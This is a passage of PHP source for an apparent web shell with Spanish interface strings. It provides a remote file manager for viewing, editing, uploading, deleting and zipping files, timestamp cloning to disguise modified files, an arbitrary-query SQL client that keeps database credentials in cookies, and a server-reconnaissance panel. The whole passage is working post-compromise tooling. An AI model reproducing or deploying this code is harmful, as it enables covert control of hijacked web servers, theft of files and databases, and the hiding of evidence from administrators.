				
				$show_offset  = '00000000<br>';
				$show_hex     = '';
				$show_content = '';
				$counter      = 0;
				$str_len      = strlen($str);
				for ($i = 0; $i < $str_len; $i++) {
					$counter++;
					$show_hex .= sprintf('%02X', ord($str[$i])) . ' ';
					switch (ord($str[$i])) {
						case 0 :
						case 9 :
						case 10:
						case 13:
						case 32: $show_content .= ' '; break;
						default: $show_content .= $str[$i];
					}
					if ($counter === $config['hexdump_rows']) {
						$counter = 0;
						if ($i + 1 < $str_len) $show_offset .= sprintf('%08X', $i + 1) . '<br>';
						$show_hex .= '<br>';
						$show_content .= "\n";
					}
				}
				$content .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . htmlspecialchars($show_content) . '</pre></td></tr></table></center><br>';
			} elseif (@simpleValidate($_POST['highlight'])) {
				if (@function_exists('highlight_file')) {
					/*function highlight_file_with_line_numbers($file) { 
						$code = substr(highlight_file($file, true), 36, -15);

						$lines = explode('<br />', $code);
						$lineCount = count($lines);
						$padLength = strlen($lineCount);
						echo "<code><span style=\"color: #000000\">";
						
						foreach($lines as $i => $line) {
							$lineNumber = str_pad($i + 1,  $padLength, '0', STR_PAD_LEFT);
							echo sprintf('<br><span style="color: #999999">%s | </span>%s', $lineNumber, $line);
						}

						echo "</span></code>";
					}*/
					$code = highlight_file($_POST['target'], true); 
					$content .= '<b>Highlight content:</b><br><br>' .
								'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . str_replace(array('<span ','</span>'), array('<font ','</font>'), $code) . '</div>'; 
				} else {
					simpleDialog('La funcion usada no esta disponible');
				}
			} else {
				$str = @fread($fp, filesize($_POST['target']));
				$content .= '<b>File content:</b><br><br>' .
							'<textarea class="area bigarea" id="filecontent" name="filecontent" readonly>' . htmlspecialchars($str) . '</textarea><br><br>';
			}
		} else {
			$content .= simpleDialog('Error leyendo archivo');
		}
		@fclose($fp);
	} elseif (@$_POST[$config['Mode']] === 'edit') {
		if(file_exists($_POST['target'])) {
			$tmp = pathinfo($_POST['target']);
			$fp = @fopen($_POST['target'], 'r');
			$contents = @fread($fp, filesize($_POST['target']));
			@fclose($fp);
		
			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($_POST['target'])));
			if ($filemtime[0] === '1970') $content .= simpleDialog('No se puede leer la fecha de creacion!');

			$content .= '
					<h2>File Edit</h2><br><br>
					<form name="form" action="' . $self . '" method="post" >
						<input type="hidden" name="' . $config['Menu'] . '" value="file" />
						<input type="hidden" name="' . $config['Action'] . '" value="moddatefile" />
						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
						<h3>Clone folder/file was last modified time &raquo;</h3>
						<p>Alter folder/file<br /><input class="input" name="curfile" id="curfile" value="' . $_POST['target'] . '" type="text" size="120"  /></p>
						<p>Reference folder/file (fullpath)<br /><input class="input" name="tarfile" id="tarfile" value="" type="text" size="120"  /></p>
						<p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
					</form>
					
					<form name="form" action="' . $self . '" method="post" >
						<input type="hidden" name="' . $config['Menu'] . '" value="file" />
						<input type="hidden" name="' . $config['Action'] . '" value="moddate" />
						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
						<h3>Set last modified &raquo;</h3>
						<p>
							Current folder/file (fullpath)<br />
							<input class="input" name="curfile" id="curfile" value="' . $_POST['target'] . '" type="text" size="120" />
						</p>
						<p>
							year: <input class="input" name="year" id="year" value="' . $filemtime[0] . '" type="text" size="4" />
							month: <input class="input" name="month" id="month" value="' . $filemtime[1] . '" type="text" size="2" />
							day: <input class="input" name="day" id="day" value="' . $filemtime[2] . '" type="text" size="2" />
							hour: <input class="input" name="hour" id="hour" value="' . $filemtime[3] . '" type="text" size="2" />
							minute: <input class="input" name="minute" id="minute" value="' . $filemtime[4] . '" type="text" size="2" />
							second: <input class="input" name="second" id="second" value="' . $filemtime[5] . '" type="text" size="2" />
						</p>
						<p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
					</form>

					<form name="form" action="' . $self . '" method="post" >
						<input type="hidden" name="' . $config['Menu'] . '" value="file" />
						<input type="hidden" name="' . $config['Action'] . '" value="edit" />
						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
						<p>File Name:<br><input class="input" name="editfilename" value="' . $_POST['target'] . '" type="text" size="100%"></p><br>
						<p>File content:<br><center><textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25" style="width: 99%;">' . htmlspecialchars($contents) . '</textarea></center>
						<br><br><center><input class="bt" name="submit" id="submit" type="submit" value="Submit"></center><br><br>
					</form>';
		}
	} else {
        # Acciones
        // Obtenemos el directorio en el que estamos
        $current_dir = @$_POST['dir'];
        if (empty($current_dir)) $current_dir = $nowpath;

        if (simpleValidate(@$_POST[$config['Action']])) {
            switch ($_POST[$config['Action']]) {
                case 'createfile':
                    if (file_exists($current_dir . $_POST['mkfile'])) {
                        $content .= simpleDialog('<b>Make File "' . $_POST['mkfile'] . '"</b>: object alredy exists');
                    } elseif (! fopen($current_dir . $_POST['mkfile'], 'w')) {
                        $content .= simpleDialog('<b>Make File "' . $_POST['mkfile'] . '"</b>: access denied');
                    } else {
                        $fp = @fopen($current_dir . $_POST['mkfile'], 'w');
                        @fclose($fp);
                        $content .= simpleDialog('<b>Archivo "' . $_POST['mkfile'] . '" creado correctamente</b>');
                    }
                    break;

                case 'createdir':
                    if (file_exists($current_dir . $_POST['newdirname'])) {
                        $content .= simpleDialog('<b>El directorio ya existe</b>');
                    } else {
                        $content .= simpleDialog('<b>Directorio creado ' . (@mkdir($current_dir . $_POST['newdirname'], 0777, true) ? 'correctamente' : 'fallo') . '</b>');
                        @chmod($current_dir . $_POST['newdirname'], 0777);
                    }
                    break;

                case 'deldir':
                    if (! file_exists($_POST['deldir'])) {
                        $content .= simpleDialog($_POST['deldir'] . ' directory does not exist');
                    } else {
                        $content .= simpleDialog('Directorio borrado ' . (delTree($_POST['deldir']) ? basename($_POST['deldir']) . ' correctamente' : 'fallo'));
                    }
                    break;

                case 'upload':
                    $content .= simpleDialog('Archivo subido ' . (@copy($_FILES['uploadfile']['tmp_name'], $_POST['dir'] . '/' . $_FILES['uploadfile']['name']) ? 'correctamente' : 'fallo'));
                    break;

                case 'edit': // Editar archivo
                    $fp = @fopen($_POST['editfilename'], 'w');
                    $content .= simpleDialog('Archivo guardado ' . (@fwrite($fp, $_POST['filecontent']) ? 'correctamente' : 'fallo'));
                    @fclose($fp);
                    break;

                case 'modpers': //Modificar atributos de archivo
                    if (! file_exists($pfile)) {
                        $content .= simpleDialog('El archivo original no existe');
                    } else {
                        $newperm = base_convert($newperm, 8, 10);
                        $content .= simpleDialog('Atributos modificados ' . (@chmod($pfile, $newperm) ? 'correctamente' : 'fallo'));
                    }
                    break;

                case 'rename': // Renombrar basenames
                    $nname = $nowpath . @$_POST['newfilename'];
                    if (file_exists($nname) or ! file_exists($_POST['oldfilename'])) {
                        $content .= simpleDialog($nname . ' Ya existe o el archivo original esta perdido');
                    } else {
                        $content .= simpleDialog('"' . basename($_POST['oldfilename']) . '" renamed "' . basename($nname) . (@rename($_POST['oldfilename'], $nname) ? '" correctamente' : '" fallo'));
                    }
                    break;

                case 'copy':
					if (@$_POST['dl']) {
                        $failnames = '';
						$succ = $fail = 0;
						
                        for ($z = 0; count($_POST['dl']) > $z; $z++) {
							$fileinfo = pathinfo($_POST['dl'][$z]);
							if (file_exists($_POST['copy'].$fileinfo['basename']) || ! file_exists($_POST['dl'][$z])) {
								$content .= simpleDialog('Ya existe o el archivo original esta perdido');
							} else {
								if (is_dir($_POST['dl'][$z])) { 
								    if (@recursiveCopy($_POST['dl'][$z], $_POST['copy'] . $fileinfo['basename'] . '/')) {
										$succ++;
									} else {
										$failnames .= $_POST['dl'][$z] . ' ';
										$fail++;
									}
								} else {
									if (@copy($_POST['dl'][$z], $_POST['copy'] . $fileinfo['basename'])) {
										$succ++;
									} else {
										$failnames .= $_POST['dl'][$z] . ' ';
										$fail++;
									}
								}
							}                            
                        }
                    
                        $content .= simpleDialog('Copiado finalizado: ' . count($_POST['dl']) . '<br> correctamente ' . $succ . ' - fallidos ' . $fail . ' ' . $failnames);
                    } else {
                        $content .= simpleDialog('Selecciona archivo(s)');
                    }
                    break;

                case 'moddatefile': // Modificar fecha de archivo copiando la de otro archivo
                    if (! @file_exists($curfile) || ! @file_exists($tarfile)) {
                        $content .= simpleDialog('Ya existe o el archivo original esta perdido');
                    } else {
                        $time = @filemtime($tarfile);
                        $content .= simpleDialog('Modificar fecha ' . (@touch($curfile, $time, $time) ? 'correctamente' : 'fallo'));
                    }
                    break;

                case 'moddate': // Modificar fecha de archivo
                    if (! @file_exists($_POST['curfile'])) {
                        $content .= simpleDialog(basename($_POST['curfile']) . ' no existe');
                    } else {
                        $time = strtotime($_POST['year'] . '-' . $_POST['month'] . '-' . $_POST['day'] . ' ' . $_POST['hour'] . ':' . $_POST['minute'] . ':' . $_POST['second']);
                        $content .= simpleDialog('Modificada fecha ' . (@touch($_POST['curfile'], $time, $time) ? 'correctamente' : 'fallo'));
                    }
                    break;

                case 'compress':
                    if ($_POST['dl']) {
                        $zip = new PHPZip();
                        $zip->Zipper($_POST['dl']);
                        header('content-type: application/octet-stream');
                        header('Accept-Ranges: bytes');
                        //header('Accept-Length: ' . strlen($compress));
                        header('content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-H:i:s') . '.zip');
                        echo $zip->file();
                        exit;
                    } else {
                        $content .= simpleDialog('Selecciona que comprimir');
                    }
                    break;

                case 'delfiles':
					if (@$_POST['dl']) {
                        $succ = $fail = 0;
                        for ($z = 0; count($_POST['dl']) > $z; $z++) {
                            if (is_dir($_POST['dl'][$z])) {
                                if (@delTree($_POST['dl'][$z])) {
                                    $succ++;
                                } else {
                                    $fail++;
                                }
                            } else {
                                if (@unlink($_POST['dl'][$z])) {
                                    $succ++;
                                } else {
                                    $fail++;
                                }

                            }
                        }
                        $content .= simpleDialog('Borrado ha finalizado: ' . count($_POST['dl']) . ' correctamente ' . $succ . ' - fallidos ' . $fail);
                    } else {
                        $content .= simpleDialog('Selecciona archivo(s)');
                    }
                    break;

                case 'downfile':
                    if (! @file_exists($_POST['downfile'])) {
                        $content .= simpleDialog('The file you want Downloadable was nonexistent');
                    } else {
                        $fileinfo = pathinfo($_POST['downfile']);
                        header('content-type: application/x-' . $fileinfo['extension']);
                        header('content-Disposition: attachment; filename=' . $fileinfo['basename']);
                        header('content-Length: ' . filesize($_POST['downfile']));
                        @readfile($_POST['downfile']);
                        exit;
                    }
                    break;
            }
        }

        $dir_writeable = @is_writable($nowpath) ? $lang['writable'] : $lang['no'] . ' ' . $lang['writable'];

        $content .= '<form id="filelist" name="filelist" action="' . $self . '" method="post" enctype="multipart/form-data">
			<div id="info"></div>
			<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';

        $free = @disk_free_space($nowpath);
        $all = @disk_total_space($nowpath);
        if ($free) $content .= '<h2>' . $lang['freespace'] . ' ' . sizecount($free) . ' ' . $lang['of'] . ' ' . sizecount($all) . ' (' . round(100 / ($all / $free), 2) . '%)</h2>';
		
		$content .= '<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
			  <tr>
					<td nowrap>' . $lang['acdir'] . ' [' . $dir_writeable . ($isWIN ? '' : ', ' . getChmod($nowpath)) . ']: </td>
					<td width="100%">
					&nbsp;<input class="input" name="dir" value="' . $current_dir . '" type="text" size="100%">
					&nbsp;<input class="bt" value="'. $lang['go'] .'" type="submit">
					</td>
			  </tr>
			</table>

			<tr class="alt1"><td colspan="7" style="padding:5px;">
			<div style="float:right;">
			<input class="input" name="uploadfile" value="" type="file" />
			<input class="bt" value="Upload" type="submit" onclick="process(\'upload\');">
			</div>';

        if ($isWIN && $isCOM) {
            $obj = new COM('scripting.filesystemobject');
            if ($obj && is_object($obj)) {
                $content .= $lang['dd'] . ': ';

                $DriveTypeDB = array(
                    0 => 'Unknow',
                    1 => 'Removable',
                    2 => 'Fixed',
                    3 => 'Network',
                    4 => 'CDRom',
                    5 => 'RAM Disk');
                foreach ($obj->Drives as $drive) {
                    if ($drive->DriveType == 2) {
                        $content .= ' [<a href="#" onclick="go(\'dir=' . $drive->Path . '/\');" title="Size:' . sizecount($drive->TotalSize) . 'Free:' . sizecount($drive->FreeSpace) . 'Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
                    } else {
                        $content .= ' [<a href="#" onclick="if (confirm(\'Make sure that disk is avarible, otherwise an error may occur.\')) go(\'dir=' . $drive->Path . '/\');" title="Type: ' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
                    }
                }

                $content .= '<br>';
            }
        }

        $content .= '
		<a href="#" onclick="go(\'dir=' . $_SERVER['DOCUMENT_ROOT'] . '/\');">' . $lang['webroot'] . '</a> | 
		<a href="#" onclick="go(\'dir=' . $nowpath . '/&view_writable=dir\');">' . $lang['vwdir'] . '</a> | 
		<a href="#" onclick="go(\'dir=' . $nowpath . '/&view_writable=file\');">' . $lang['vwfils'] . '</a> | 
		<a href="#" onclick="createdir(\'' . $current_dir . '\');return false;">' . $lang['cdir'] . '</a> | 
		<a href="#" onclick="createfile(\'' . $current_dir . '\');return false;">' . $lang['cfil'] . '</a>
		</td></tr></table>
		<br>';

        $dirdata = array();
        $filedata = array();
		
		if (@$_POST['view_writable'] === 'dir') {
			$dirdata = GetWDirList($current_dir);
		} elseif (@$_POST['view_writable'] === 'file') {
			$filedata = GetWFileList($current_dir);
		} elseif (@simpleValidate($_POST['findstr'])) {
			$filedata = GetSFileList($current_dir, $_POST['findstr'], $_POST['re']);
		} else {
            if ($dirs = @opendir($current_dir)) {
				$c = 0;
				$start = False;
				$show = True;
				
				if ($config['FMLimit'] AND isset($_POST['FMLimit'])) {
					$start = ($_POST['FMLimit'] > 1 ? $config['FMLimit'] * ($_POST['FMLimit'] - 1) : $config['FMLimit']);
					$config['FMLimit'] = $config['FMLimit'] * $_POST['FMLimit'];
				}

                while ($file = @readdir($dirs)) {
					if ($config['FMLimit'])	{
						if ($start) if ($c == $start) $start = True;
						if ($c == $config['FMLimit']) break;  
					}
					if ($show) {
						$filepath = $current_dir . $file;
						if (@is_dir($filepath)) {
							if ($file !== '.' and $file !== '..') {
								$c++;
								$dirdb['filename'] = $file;
								$dirdb['mtime'] = @date('Y-m-d H:i:s', filemtime($filepath));
								$dirdb['dirchmod'] = getChmod($filepath);
								$dirdb['dirperm'] = getPerms($filepath);
								$dirdb['fileowner'] = getUser($filepath);
								$dirdb['dirlink'] = $current_dir;
								$dirdb['server_link'] = $filepath . '/';
								//$dirdb['client_link'] = urlencode($filepath);
								$dirdata[] = $dirdb;
							}
						} else {
							$c++;
							$filedb['filename'] = $file;
							$filedb['size'] = sizecount(@filesize($filepath));
							$filedb['mtime'] = @date('Y-m-d H:i:s', filemtime($filepath));
							$filedb['filechmod'] = getChmod($filepath);
							$filedb['fileperm'] = getPerms($filepath);
							$filedb['fileowner'] = getUser($filepath);
							$filedb['dirlink'] = $current_dir;
							$filedb['server_link'] = $filepath;
							//$filedb['client_link'] = urlencode($filepath);
							$filedata[] = $filedb;
						}
					} 
                }
                unset($dirdb);
                unset($filedb);
                @closedir($dirs);
                @sort($dirdata);
                @sort($filedata);
            } else {
				$content .= simpleDialog('No se puede abrir la carpeta');
			}
        }

			$content .= '<table class="explore sortable">
			<thead><tr class="alt1">
			<td></td>
			<td><b>' . $lang['name'] . '</b></td>
			<td><b>' . $lang['date'] . '</b></td>
			<td><b>' . $lang['size'] . '</b></td>
			' . (! $isWIN ? '<td width="20%"><b>Chmod/Chown</b></td>' : '') . '
			<td><b>' . $lang['action'] . '</b></td>
			</tr></thead>
			<tbody><tr class="alt2">
			<td width="1%"></td>
			<td width="100%" nowrap>' . $img['lnk'] . ' <a href="#" onclick="go(\'dir=' . getUpPath($current_dir) . '\');">Parent Directory</a></td>
			<td nowrap></td>
			<td nowrap></td>
			' . (! $isWIN ? '<td nowrap></td>' : '') . '
			<td nowrap></td>
			</tr>';
					
			$d = 0;
			$bg = 2;
            foreach ($dirdata as $key => $dirdb) {
				$thisbg = ($bg++ % 2 == 0) ? 'alt1' : 'alt2';
                $content .= '<tr class="' . $thisbg . '">
							<td nowrap><input type="checkbox" value="' . $dirdb['server_link'] . '" name="dl[]"></td>
							<td>' . $img['dir'] . ' <a href="#" onclick="go(\'dir=' . $dirdb['server_link'] . '\');">' . $dirdb['filename'] . '</a></td>
							<td nowrap>' . $dirdb['mtime'] . '</td>
							<td nowrap><a href="#" onclick="viewSize(\'' . $dirdb['server_link'] . '\', \'D' . $d . '\');return false;"><div id="D' . $d . '">[?]</div></a></td>
							' . (! $isWIN ? '<td nowrap>
							<a href="#" onclick="fileperm(\'' . $dirdb['server_link'] . '\');return false;">' . $dirdb['dirchmod'] . '</a>
							<a href="#" onclick="fileperm(\'' . $dirdb['server_link'] . '\');return false;">' . $dirdb['dirperm'] . '</a>' . $dirdb['fileowner'] . '</td>' : '') . '
							<td nowrap><a href="#" onclick="deldir(\'' . $dirdb['server_link'] . '\');return false;">' . $img['del'] . '</a> <a href="#" onclick="rename(\'' . $dirdb['server_link'] . '\');return false;">' . $img['edit'] . '</a></td>
							</tr>';
				$d++;
            }

            foreach ($filedata as $key => $filedb) {
				$thisbg = ($bg++ % 2 == 0) ? 'alt1' : 'alt2';
                $fileurl = str_replace(SA_ROOT, '', $filedb['server_link']);

                $content .= '<tr class="' . $thisbg . '">
							<td width="2%" nowrap><input type="checkbox" value="' . $filedb['server_link'] . '" name="dl[]"></td>';

                // marco archivo de la shell en la lista
                if (strstr($filedb['server_link'], $_SERVER['PHP_SELF'])) $content .= '<td>' . $img['php'] . ' <font color="yellow">' . $filedb['filename'] . '</font></td>';
                else $content .= '<td>' . showIcon($filedb['filename']) . ' <a href="' . $fileurl . '" target="_blank">' . $filedb['filename'] . '</a></td>';

                $content .= '<td nowrap><a href="#" onclick="">' . $filedb['mtime'] . '</a></td>
							<td nowrap>' . $filedb['size'] . '</td>
							' . (! $isWIN ? '<td nowrap>
							<a href="#" onclick="fileperm(\'' . $filedb['server_link'] . '\');return false;">' . $filedb['filechmod'] . '</a>
							<a href="#" onclick="fileperm(\'' . $filedb['server_link'] . '\');return false;">' . $filedb['fileperm'] . '</a>' . $filedb['fileowner'] . '</td>' : '') . '
							<td nowrap>
							<a href="#" onclick="go(\'' . $config['Mode'] . '=info&target=' . $filedb['server_link'] . '\');">' . $img['info'] . '</a> 
							<a href="#" onclick="go(\'' . $config['Mode'] . '=edit&target=' . $filedb['server_link'] . '\');">' . $img['edit'] . '</a> 
							<a href="#" onclick="go(\'' . $config['Action'] . '=downfile&downfile=' . $filedb['server_link'] . '\');">' . $img['download'] . '</a> 
							</td></tr>';
            }

            $content .= '<tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
					<td width="2%" nowrap>
					<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" />
					</td>
					<td>
					' . $lang['selected'] . ': 
					<a href="#" onclick="process(\'compress\');">' . $lang['download'] . '</a> | 
					<a href="#" onclick="if (confirm(\'' . $lang['merror'] . '\')) process(\'delfiles\');">' . $lang['del'] . '</a> | 
					<a href="#" onclick="copyfile();return false;">' . $lang['copy'] . '</a>
					</td>
					<td colspan="4" align="right">
					<b>' . $d . '</b> ' . $lang['dirs'] . ' / <b>' . ($c - $d) . '</b> ' . $lang['fils'] . '
					</td>
					</tr></tfoot>
					</table></form>';
        }
}

if (@$_POST[$config['Menu']] === 'sql') {
	$sql = array();
	$sql_deleted = '';
	$login_time = 604800; //3600 * 24 * 7;
	$show_form = $show_dbs = true;

	function hss($t){
		return htmlspecialchars($t);
	}
		
	function adds($s){
		global $isWIN;
		return ($isWIN) ? addslashes($s) : $s;
	}

	if(isset($_POST['dc'])){
		$k = $_POST['dc'];
		setcookie('c['.$k.']', '', time() - $login_time);
		$sql_deleted = $k;
	}

	if(isset($_COOKIE['c']) && !isset($_POST['connect'])){
		foreach($_COOKIE['c'] as $c => $d){
			if($c==$sql_deleted) continue;
			$dbcon = (function_exists('json_encode') && function_exists('json_decode')) ? json_decode($d) : unserialize($d);
			foreach($dbcon as $k => $v) $sql[$k] = $v;
			$sqlport = ($sql['port'] !== '') ? ':'.$sql['port'] : '';
			$content .= simpleDialog('['.$sql['type'].'] '.$sql['user'].'@'.$sql['host'].$sqlport.'
						<span style="float:right;"><a href="#" onclick="go(\''.$config['Menu'].'=sql&connect=connect&sqlhost='.$sql['host'].'&sqlport='.$sql['port'].'&sqluser='.$sql['user'].'&sqlpass='.$sql['pass'].'&sqltype='.$sql['type'].'\');">connect</a> | <a href="#" onclick="go(\''.$config['Menu'].'=sql&dc='.$c.'\')">disconnect</a></span>');
		}
	} else {
		$sql['host'] = isset($_POST['sqlhost']) ? $_POST['sqlhost'] : '';
		$sql['port'] = isset($_POST['sqlport']) ? $_POST['sqlport'] : '';
		$sql['user'] = isset($_POST['sqluser']) ? $_POST['sqluser'] : '';
		$sql['pass'] = isset($_POST['sqlpass']) ? $_POST['sqlpass'] : '';
		$sql['type'] = isset($_POST['sqltype']) ? $_POST['sqltype'] : '';
	}

	if(isset($_POST['connect'])){
		$con = sql_connect($sql['type'], $sql['host'], $sql['user'], $sql['pass']);
		$sqlcode = isset($_POST['sqlcode']) ? $_POST['sqlcode'] : '';

		if($con !== false){
			if(isset($_POST['sqlinit'])){
				$sql_cookie = (function_exists('json_encode') && function_exists('json_decode')) ? json_encode($sql):serialize($sql);
				$c_num = substr(md5(time().rand(0,100)),0,3);
				while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($c_num, $_COOKIE['c'])){
					$c_num = substr(md5(time().rand(0,100)),0,3);
				}
				setcookie('c['.$c_num.']', $sql_cookie ,time() + $login_time);
			}
			$show_form = false;
			$content .= '<form action="" method="post">
				<input type="hidden" name="sqlhost" value="'.$sql['host'].'" />
				<input type="hidden" name="sqlport" value="'.$sql['port'].'" />
				<input type="hidden" name="sqluser" value="'.$sql['user'].'" />
				<input type="hidden" name="sqlpass" value="'.$sql['pass'].'" />
				<input type="hidden" name="sqltype" value="'.$sql['type'].'" />
				<input type="hidden" name="' . $config['Menu'] . '" value="sql" />
				<input type="hidden" name="connect" value="connect" />
				<textarea id="sqlcode" name="sqlcode" class="bigarea" style="height:100px;">'.hss($sqlcode).'</textarea>
				<p><input type="submit" name="gogo" class="inputzbut" value="Execute" />
				&nbsp;&nbsp;Separate multiple commands with a semicolon  <span>[ ; ]</span></p>
				</form>';

			if($sqlcode !== ''){
				$querys = explode(';',$sqlcode);
				foreach($querys as $query){
					if(trim($query) !== ''){
						$result = sql_query($sql['type'],$query,$con);
						if($result !== false){
							$content .= '<hr /><p style="padding:0;margin:6px 10px;font-weight:bold;">'.hss($query).';&nbsp;&nbsp;&nbsp;<span>[ ok ]</span></p>';

							if(!is_bool($result)){
								$content .= '<table class="explore sortable" style="width:100%;"><tr>';
								for($i = 0; $i<sql_num_fields($sql['type'], $result, $con); $i++)
									$content .= '<th>'.@hss(sql_field_name($sql['type'], $result, $i)).'</th>';
								$content .= '</tr>';
								while($rows=sql_fetch_data($sql['type'], $result)){
									$content .= '<tr>';
									foreach($rows as $r){
										//if ($r === '') $r = ' ';
										$content .= '<td>'.@hss($r).'</td>';
									}
									$content .= '</tr>';
								}
								$content .= '</table>';
							}
						} else {
							$content .= '<p style="padding:0;margin:6px 10px;font-weight:bold;">'.hss($query).';&nbsp;&nbsp;&nbsp;<span>[ error ]</span></p>';
						}
					}
				}
			} else {
				if(($sql['type']!=='pdo') && ($sql['type']!=='odbc')){
					if($sql['type']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
					elseif($sql['type']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
					elseif($sql['type']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
					elseif($sql['type']==='sqlite' || $sql['type']==='sqlite3') $showdb = "SELECT '".$sql['host']."'";
					else $showdb = 'SHOW DATABASES'; //mysql

					$result = sql_query($sql['type'], $showdb, $con);
					if($result !== false) {
						while($rowarr = sql_fetch_data($sql['type'], $result)){
							foreach($rowarr as $rows){
								$thisbg = ($bg++ % 2 == 0) ? 'alt1' : 'alt2';
								$content .= '<p class="notif ' . $thisbg . '" onclick=\'toggle("db_'.$rows.'")\'>'.$rows.'</p><div class="info" id="db_'.$rows.'"><table class="explore">';

								if($sql['type']==='mssql') $showtbl = 'SELECT name FROM '.$rows."..sysobjects WHERE xtype = 'U'";
								elseif($sql['type']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$rows."'";
								elseif($sql['type']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$rows."'";
								elseif($sql['type']==='sqlite' || $sql['type']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
								else $showtbl = 'SHOW TABLES FROM '.$rows; //mysql

								$result_t = sql_query($sql['type'], $showtbl, $con);
								if($result_t!=false) {
									while($tablearr=sql_fetch_data($sql['type'], $result_t)){
										foreach($tablearr as $tables){
											if($sql['type']==='mssql') $dump_tbl = 'SELECT TOP 100 * FROM '.$rows.'..'.$tables;
											elseif($sql['type']==='pgsql') $dump_tbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 100 OFFSET 0';
											elseif($sql['type']==='oracle') $dump_tbl = 'SELECT * FROM '.$rows.'.'.$tables.' WHERE ROWNUM BETWEEN 0 AND 100;';
											elseif($sql['type']==='sqlite' || $sql['type']==='sqlite3') $dump_tbl = 'SELECT * FROM '.$tables.' LIMIT 0, 100';
											else $dump_tbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 0, 100'; //mysql
											
											$content .= '<tr><td><a href="#" onclick="go(\''.$config['Menu'].'=sql&connect=&sqlhost='.$sql['host'].'&sqlport='.$sql['port'].'&sqluser='.$sql['user'].'&sqlpass='.$sql['pass'].'&sqltype='.$sql['type'].'&sqlcode='.$dump_tbl.'\')">'.$tables.'</a></td></tr>';
										}
									}
								}
								$content .= '</table></div>';
							}
						}
					}
				}
			}
				
			sql_close($sql['type'], $con);
		} else {
			$content .= simpleDialog('Unable to connect to database');
			$show_form = true;
		}
	}

	if($show_form){
		$sqllist = '';
		if (function_exists('mysql_connect') || function_exists('mysqli_connect')) $sqllist .= '<option value="mysql">MySQL [using mysql_* or mysqli_*]</option>';
		if (function_exists('mssql_connect') || function_exists('sqlsrv_connect')) $sqllist .= '<option value="mssql">MsSQL [using mssql_* or sqlsrv_*]</option>';
		if (function_exists('pg_connect')) $sqllist .= '<option value="pgsql">PostgreSQL [using pg_*]</option>';
		if (function_exists('oci_connect]')) $sqllist .= '<option value="oracle">Oracle [using oci_*]</option>';
		if (function_exists('sqlite_open')) $sqllist .= '<option value="sqlite">SQLite [using sqlite_*]</option>';
		if (class_exists('SQLite3')) $sqllist .= '<option value="sqlite3">SQLite3 [using class SQLite3]</option>';
		if (function_exists('odbc_connect')) $sqllist .= '<option value="odbc">ODBC [using odbc_*]</option>';			
		if (class_exists('PDO')) $sqllist .= '<option value="pdo">PDO [using class PDO]</option>';
			
		$content .= '<form action="" method="post" />' .
					'<table class="myboxtbl">' .
					'<tr><td>Host/DSN/Connection String/DB File</td><td><input style="width:100%;" type="text" name="sqlhost" value="" /></td></tr>' .
					'<tr><td>Username</td><td><input style="width:100%;" type="text" name="sqluser" value="" /></td></tr>' .
					'<tr><td>Password</td><td><input style="width:100%;" type="password" name="sqlpass" value="" /></td></tr>' .
					'<tr><td>Port (optional)</td><td><input style="width:100%;" type="text" name="sqlport" value="" /></td></tr>' .
					'<tr><td>Engine</td><td><select name="sqltype">' . $sqllist . '</select></td></tr>' .
					'</table>' .
					'<input type="submit" name="connect" value="Connect!" />' .
					'<input type="hidden" name="sqlinit" value="init" />' .
					'<input type="hidden" name="' . $config['Menu'] . '" value="sql" />' .
					'</form>';
	}
}

if (@$_POST[$config['Menu']] === 'phpenv') {
    $upsize = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
    $adminmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
    $dis_func = get_cfg_var('disable_functions');
    ! $dis_func && $dis_func = 'No';

    $info = array(
        1 => array('Server Time', date('Y/m/d h:i:s', time())),
        2 => array('Server Domain', $_SERVER['SERVER_NAME']),
        3 => array('Server IP', gethostbyname($_SERVER['SERVER_NAME'])),
        4 => array('Server OS', PHP_OS),
        5 => array('Server OS Charset', $_SERVER['HTTP_ACCEPT_LANGUAGE']),
        6 => array('Server Software', $_SERVER['SERVER_SOFTWARE']),
        7 => array('Server Web Port', $_SERVER['SERVER_PORT']),
        8 => array('PHP run mode', php_sapi_name()),
        9 => array('This file path', __file__),

        10 => array('PHP Version', PHP_VERSION),
        11 => array('PHP Info', ((function_exists('phpinfo') and @! in_array('phpinfo', $dis_func)) ? '<a href="#" onclick="go(\''.$config['Menu'].'=phpinfo\')">Yes</a>' : 'No')),
        12 => array('Safe Mode', getcfg('safe_mode')),
        13 => array('Administrator', $adminmail),
        14 => array('allow_url_fopen', getcfg('allow_url_fopen')),
        15 => array('enable_dl', getcfg('enable_dl')),
        16 => array('display_errors', getcfg('display_errors')),
